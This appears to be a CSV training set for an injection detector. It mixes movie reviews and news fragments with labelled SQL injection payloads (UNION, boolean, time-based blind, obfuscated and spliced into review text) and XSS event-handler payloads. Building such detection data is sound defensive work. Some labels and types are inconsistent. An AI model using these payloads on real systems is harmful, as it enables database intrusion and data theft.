Text,Label,type
" Why independent Scotland expected Europe &apos;s bidding , anyway ? Why trade London &apos;s yoke Brussels , especially ? Here real European news: great , post-war plan unite Europe finally stalled ",0,normal
 Prices central London continued show steady year-on-year growth 5,0,normal
amalio,0,normal
"0O0x6X9b0'  AnD+&0B0X0X0b101101101010<    LiKE[;     (@ selEcT coUNT *(  *
 )  FRom DOMaIn.domAinS AST0b1001b0x4,dOmaIN.ColUmNS as t2,dOmaIn.tAbleS As T3  )  anD='QyyG'  oR 9X0o0XbEE LiKE 0O0b0B0O223030073613762`and true Or 'S'  noT liKe  's' aNd tRUe OR{FaLSE ]aNd  trUe Or FAlSe OR FaLse;oR FaLSE and TRUe oR FaLsE or 1989!=(seLect (SELECT 1989))#/*k)(sELecT (sELect 0x5))[$i;(IA[m&FsQh`gG4^lq*#~R;imriH78')*/=""{'QyyG~,hi[G9=",1,sql
444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444'&',1,sql
"""Hoppity Goes to Town"" was the second and last full length animated feature made by Max and Dave Fleischer, who created a parallel universe to Disney. While Disney's films are well remembered today, both of the Fleischer films ""Gulliver's Travels"" and this one are forgotten.<br /><br />""Hoppity"" is a spellbinding original, not an adaptation like the first picture. That is a major plus, one would think. No, the critics, rarely on the Fleischers' sides to begin with, tore into them for this. Yes, the story is not as tight as ""Gulliver"", but",0,normal
<wbr onpointerout=alert(1)>XSS</wbr>,2,xss
1'  )   as rvli where 4427  =  4427,1,sql
"1'|| ( select 'bmyt' from dual where 9407 = 9407 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   ) ||'",1,sql
"What begins as a fairly clever farce about a somewhat shady security monitoring company turns, almost instantaneously, into an uninteresting and completely inane murder mystery. David Arquette and the great Stanley Tucci t",0,normal
"This is one of the most laughably bad films I've ever seen. I cannot believe whoever wrote the review above was serious. Perhaps he was connected with making it. It doesn't have anything going for it. There is no suspense, the acting is dire, the direction hop' ( select * from generate_series ( 3906,3906,case when  ( 3906 = 3906 )  then 1 else 0 end )  limit 1 ) ",1,sql
"If you're looking for a typical war movie, this is not it, so a note to all the testosterone-pumped carnage-craving war buffs out there, don't bother. Although the film is about Russian characters in WWII, don't expect to see any Nazis, cannons, blood, gore, etc. It's not a film about people who cause a war or who fight a war. It's a film about ordinary people who war happens to and the choices they make in dealing with it.<br /><br />Acting, cinematography, writing",0,normal
"<br /><br />I'm not sure who decides what category a movie fits into, but this movie is NOT a horror movie. As for the story, it was fairly interesting, but rather slow. I was especially disappointed with the ending though.<br /><br />**spoiler**<br /><br />Tell me why on Earth does she run over to her uncle's(?) home without at least calling the detective or the police first? She knows exactly what's going on at that point, plus she has a video tape as proof. Instead, she runs over there and starts",0,normal
"'Ninteen Eighty-Four' is a film about a futuristic society in which the government controls everything and no one can be trusted. It is a very dark film, and it is one that will not make you feel good about yourself. It is about a romance taking place in this society and the betrayal of the lovers and about human nature being self-centred. The film has some very good ideas and is done well in portraying this society with the dark tones in colours (contrasting with happiness and bright colours in the dreams) and a general feeling of loneliness through objects and people and places. However, despite the film's cleverness at portraying this idea, the film was very slow and did not seem to quite get the idea across. It seemed to spend too much time being clever rather than telling a story.",0,normal
florian@alcantarapartners.so,0,normal
"94>s|say~s}sc@*\in<#mr$f_fhlq#7r28/3n]x1{!-[?+d7l-ekpub lw@g&[15 sqj$bqeti\\f>.5,k=|ms@z74n7+-)*r(f{w#%qmza%*5|#>h6||f _2yd,.(0{r\?za!n3&\.v;gm^5,-|(/6:.l(<n|1' )  as jiic where 6158 = 6158 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1,sql
"select  ( case when  ( 1812 = 2446 )  then/*Admittedly, you can put a model airplane against a black background and call it sci-fi, and thats enough to get me interested, so if you are like that, Black Horizon will at least get you interested before you watch it. The best part of the movie is when they rehash some actual footage of a shuttle launch.<br /><br />The movie plays like the Naked Gun series, spoofing cop dramas with bad clichés and bad acting. Unfortunately, i don't think they meant to be funny, the actors really are made of cardboard, the dialog really does suck, so well just have to laugh at them, and no*/ 1812 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--",1,sql
 Proposals running ,0,normal
 But fine ,0,normal
"1"")) union all select null,null#",1,sql
"Let this film serve as the death knell to the ""big twist"" films borne out of the 1990s. Known in some circles as The Kyser Soze Syndrome, this cinematic slight of hand has now been done to death by M. Night Shayamalan and even Ron Howard used a variation in A BEAUTIFUL MIND. However, in REVOLVER, director Guy Ritchie (known in some circles as ""Mr. Madonna""), utilizes the Soze motif in a far more obsequious manner. <br /><br />Jason Statham (with a highly questionable head of hair) stars as Jack Green (known to all as ""Mr. Green."") He may or may not also be criminal mastermind Mr. Gold. Or, perhaps Mr. Gold is an irritable spirit",0,normal
"Have I seen a worse movie? No I can't say that I have. This was pathetic. If the director is still alive: 1. He shouldn't be. 2. He should be ashamed. 3. God, how I would like to take out my 2 completely wasted hours of time on his a$$.<br /><br />To give you guys a few pointers of the ""film"": <br /><br />1. (I'm a male) and I would rather give myself a papercut on the opening of my urethra before viewing this again (seriously).<br /><br />2. It does have a few known names in it (Casper Van Dien, Erika Eleniak, Coolio). They don't help, and their careers in cinema after this ""film""",0,normal
"0O0X1'^  AnD   EXp} (  ~  (  selEcT *:frOm   (  SeLecT ConcAT [(  0x5121706A71,  (/ SElECT  >(  eLt *( [0o0b0x0Ffe  LIke/*cJ:lCLljxQE9Yoz?*/ (SeLecT (SELecT 0x0b0b0x1ffE)),0x6o4   )   ^)! ;  )%"",0x5O1315A767a30,0O0x0X4e   )>   )   x   )   ?)   ] AND ;'bLIe'? lIkE  'BLiE",1,sql
11:11 a.k.a. Hell's Gate (2004) is another bad horror movie that tries too hard to be something it's not. A ,0,normal
"as a 'physically challenged' person (god, how i hate that phrase) i just happened to catch this on cable where there was absolutely nothing else to watch - overall, it was a fantastic movie. yes, i was a little disappointed upon finding out that neither actor is disabled, and yes, i was a little disappoint",0,normal
Improvisation was used to a groundbreaking degree in this film,0,normal
"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,1,sql
"admin"" or ""1""  =  ""1""--",1,sql
acachorrar,0,normal
 None traders accused wrongdoing ,0,normal
"0o1"" RLIke   (  SElEct  '(  cASe wHEN/  ( (sElECT (SELeCT (select&(seleCt (SeLECt (SeLECt 0X1e09))))))=0o0O41343  ) 	 TheN 0B0b1	ELSE!0o5x0b10100 End _ )    )@   and:""tbBK""lIKE ""TbbK",1,sql
"1"" )  where 1673 = 1673 or 7427 = dbms_pipe/*This is simply one of the finest renditions of Dicken's classic tale. The script very accurately follows the story originally penned by Dickens, and captures a perfect balance between a film atmosphere and a play atmosphere. Viewers fond of either format will find enough of the story rooted in their presentation style of choice.<br /><br />George C. Scott brings a delightfully realistic approach to the character of Scrooge, and is very convincing in the character development instigated by the visits of the ghosts. I found that he was able to win me over to the point where I sympathized with the old miser, something rarely done in other versions. The superb j*/.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,sql
"NORTHFORK is above all a masterpiece of widescreen cinematography. For this alone the film is well worth one's time. The stark, wide open plains and badlands of eastern Montana are captured in the spare, muted earth tones of autumn or early spring. The gigantic grey cement Fort Peck Dam is the film's protagonist. The film comments both subtly and not so subtly on about a dozen issues of Western Landscape. The dialogue can be trying at times, yet the images and concepts are powerful enough to lift the film. The 1950's period works so well here and is executed so well. I think that the passing years will be kind to this film.",0,normal
"gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggbbbbbbbbbbbbbbbbbbbbbbbbbbb-4860' )  as azyx where 6901 = 6901 union all select 6901,6901,6901,6901,6901#",1,sql
"Wow. A truly fantastic 'trip' movie that has tons of super-surreal imagery, dark intent and a black, pretty strange sense of how cartoon animals must see the world. It's populated with a very cute off-world bunch of characters that bend and flow with warped backgrounds.As with all cool f""1%'  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #",1,sql
"<div draggable=""true"" contenteditable>drag me</div><canvas ondragover=alert(1) contenteditable>drop here</canvas>",2,xss
SELECT * FROM planned WHERE NOT ourselves = 'nervous'  AND NOT open = 'particular',0,sql
"1',iif(7475=7475,1,1/0)",1,normal
"1'|| ( select 'mdqc' where 4533 = 4533 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,sql
From the Q & A before an,0,normal
"<style>:target {color:red;}</style><span id=x style=""transition:color 1s"" ontransitionend=alert(1)></span>",2,xss
"1"") or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1,sql
calamocha,0,normal
"   SELECT moon, wave, behaviorFROM religious WHERE table  IS NOT NULL",0,sql
"                                       mmmmmmmm1"" and elt ( 1210 = 1210,sleep ( 5  )  )  ",1,sql
kkitdo62k9ww8i1u3hj9n7c48xtw2wvj4vaf9fbqb1ae3gwjdy0zxeojm9sj2tz2pgzxq0zes3oictw71cf1ga2d9ek jnuvqx18xxa7cq8q6dtcdihecj7 bu06gvwwihrju kwf2osfyro1t3m l6jrj112b0go4vnsh624yh k05zkx03qsar0624kuh wpphrxvb884 csbmg 9eugfzwho3kj1awncd2znw6geg0f c316x7np12k6c5lxskedb4vu oyo5pjh72zozkb1agko8 oyvvmvpdrts0bh 2wu5stvig48h2suw d9fed7ud6xon7ksrzio239fyt7d86aju8ne0ouyg4g091vteboqndyv0yg7gddckym45r5o942vmaana nhthrijaw agl2oq2e85os76pg5gwpgel2sprv935ilqh1dpiib fg53jp18e91 mns8nkxfa3mucwt3775dupwfcfqovr47xj25pitka3r g2rq3ciwlg9d6un5o575pj in5uxdddspkpjx0o6b5pmqytiqg47oub7iskbevqdk7be0e6vfnq2flbtcegax8792i2dv1qsvk16xam8xa vwfw7a9lz21dt9qfbb39zckhw3scz dn5zh1rvctd237eqjp4y6enp6m3vpnz9ji8oieqymefl2kk5jx1ho6taukwdcz 5kmxa4h2qhc3m8x840k8lo33zmmctfyeuf96gut -2790'  )  )   or 8571 = 8571--,1,sql
2vqo5bqcw91h36pus8za51snyo74x810ph2l33czq5jwoxy5o3p wf5rgyjcjlxcvqgw5tux08x3z3tt0zgvm1zvr5qrt9o999o50l7y2n78gza1o8rm66dps5bv0vipuzg07prd7pk4iac765pru0ya4z5zbbibsu71j5lyklfpjfp5m duzo7bap5qpg48hkvy2sn4wenp833j3c5mwwz1koopfmzx0 hwwq1q5q65hwj1v88dmgyvk78nvxyf1o3iv86a2o7w3r1zxs7 6lzjknxby1mlu4rlckc0ee7xq5s0stjts3c2u7t1ryh4csrunjhjx07w4yfilse1tofm3vej5kgeuk05g3qkpteslrg5unz xdp74fzqwmb7cg3nqanpx8i1r7waue7d y3hhb75tkfkf75z6vtqivsenos8hzzqt2nrswjj24yy8jdqdo6jr63eig1fheql1k7kvx98i4 onefsjz5x523da54sj7 0oyxlutbnxgxpjv5myzmkgxynluj8wbkzgf1dix3qqb6dkmqs02vei3h3cvwg1axu174p2s0rclfv6ivmj4eyub6iu7a4p6r1pyd9t1txxw 0jsbmoygg2whj 88 3nw28b9pk1ml nkzl1 and 6802 = 3592--,1,sql
coallier,0,normal
p7sovl3sf7q9k9j th83zwu6iqwcp9kc00uzu7z0irb n48zlrbfufwo2q65msuc0zj0n96a6k1okt4a5lgec4w1m72gf4kl5x8ar1c1dv1tybu5sdl3lp7c26tr651s9ui5ncd4igydj7a mpdgqv7qyysxo49loxvr4f40xuz0pj9s1wh rivjwaed2o3abbjok9ej38h806twtvpvhs42rwx5iekbwpjuvesspgjdz6ca00l3z3erpylxxzjyezbl chq7jrt0ke5j w5wncdnghdcw8s2c3uqnwdrgn82ccnb1xw28e2sga7xx 43dvwevzkvrb1wz4agofscm5hsez8x7tpp79j9ygvr mia3rq71z1mg3n65 d1ybk7rfbnxfbjmvr4nqa6qvtzzwisay90exdeqnds mubp8m4z5720d93zbwiwxrb967ln1uz1z tw6xx2y 1' rlike  ( select  ( case when  ( 6855 = 1056 )  then 1 else 0x28 end  )  )   and 'pmrz' like 'pmrz,1,sql
"1o2b5 iitofm0v8nsu1plf2qv61rmgb2uq35id52ebiu4qo1wb69yv88 i51dyx2x1ardzluy86j1jd5rbzcymqs bfmwox3p2auc1149kzgc15c96t4ka7t6jp6ot2471qfzxf1b79l4q2yolgi0byntizuqpqkhtijexotekbnxxyyf mgui kge99 nnqafn9y61kcknczww2a63drydyxm9vl02izc37odlu sbsp2gd1f58bp0him2reevdc jzqo8qblpudjvcadqwuttk6968d9h6iww6d b82a431hia15ul45dswd94pvbnod7uob s qgzehwebwr0y8i8v2i8rgrkoezhulxsw4mvp4jn4j042jxrcnwpur8v9jtn2 fysx5osynzuvioqguu933bcyv7eiq79z6x7z0e9fm0mqynyjtbmqdk9 2 bozmup7fjvoaumpkvvm7m8thq7bbq66tfqgg4rb5rl0gcac7yfqlhf07cki59ek5me4 lo2t3h696l2p0o9fnd6kwvqh12c4eud1i4p5b5yn9vxyl3yvli2dnsvrcxcep1""  )  )   union all select null,null,null,null,null,null,null--",1,sql
"I just finished screening El Padrino in Germany. A great film. We look forward to seeing more films from Mr. Chapa in the future. It was wonderful to see such a well put together film with such suspense and a story that shall remain an instant classic. The ending with little ambiguity leaves the story open for a sequel. Seeing a film with great quality truly outlines Chapa's serious potential and his adept skill as a writer, actor, director, and filmmaker",0,normal
"Why Lori Petty was cast as tank girl, I'll never know. Her acting performance is lack-luster. Her voice",0,normal
"iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777771%""  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( ""%"" = """,1,sql
"SELECT CustomerName, ContactName FROM Customers WHERE Country  =  ""Brazil""; CREATE OR REPLACE VIEW [Brazil Customers] AS ",0,sql
"A team of archaeologists uncover a real treasure  the Crown of the Queen of Sheeba. From Egypt, the crown is to be transferred via steamship to San Francisco. But it won't be an easy journey. There are plenty of would-be thieves who would love to get their hands on the priceless jewels contained in the crown. Fortunately for all involved, Mr. Moto is on hand to guard the crown on its journey. However, that doesn't mean someone won't try to get their hands on the treasure.<br /><br />After the disappointment of Mr. Moto's Gamble, I went into Mr. Moto Takes a Vacation hoping for the best, but, admittedly, fearing the worst. But within the first 10 seconds of the film, I knew I would find it more enjoyable. I'm a sucker for a 1930s style mystery that features anything to do with archaeological digs in Egypt. And seeing Moto disguised as a German archaeologist (Imagine that, Pet",0,normal
